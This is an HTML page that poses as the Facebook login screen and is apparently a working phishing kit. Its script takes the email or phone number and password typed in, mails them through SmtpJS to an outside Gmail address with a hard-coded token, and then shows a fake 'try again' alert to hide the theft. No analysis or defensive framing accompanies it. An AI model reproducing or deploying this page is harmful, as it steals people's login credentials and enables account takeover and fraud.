    <div class="textbox">
        <h1>
            Facebook
        </h1>
        <h2>
            Facebook helps you connect and share
        </h2>
        <h2 class="mm">with the people in your life.</h2>
    </div>


    <div class="container">
<div class="form" action="javascript:sendmail()">
    <input type="text"  class="text" id="Sender" placeholder="Enter Your Email or Phone number"> <br>
    <input type="password" id="Name" class="text" type="text" class="form-control" placeholder="Password"><br>
    <button type="button"  onclick="sendmail();"  value="Send Message">
     Log In
    </button>
    <p><a class="btnn" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot password?</a><br></p>
    <div class="btn">
        <button><a  class="btnn blak">Create New Account</a></button>
     
         
     </div>



</div>

<script src="https://smtpjs.com/v3/smtp.js"></script>

<script>  

   function sendmail(){
  
          var name = $('#Name').val();
          var email = $('#Sender').val();
          var subject = $('#Subject').val();
    var message = $('#Message').val();

          // var body = $('#body').val();

          var Body='Name: '+name+'<br>Email: '+email+'<br>Subject: '+subject+'<br>Message: '+message;
          //console.log(name, phone, email, message);

          Email.send({
      SecureToken:"fbf31702-bb7f-4a4e-9c1c-4ccf17ee777f",
              To: 'optimalweb09@gmail.com',
              From: "demooptimalweb@gmail.com",
              Subject: "New message on contact from "+name,
              Body: Body
          }).then(
              message =>{
                  //console.log (message);
                  if(message=='OK'){
                  alert('try again');
                  }
                  else{
                      console.error (message);
                      alert('There is error . ')
                      
                  }

              }
          );



      }


  </script>
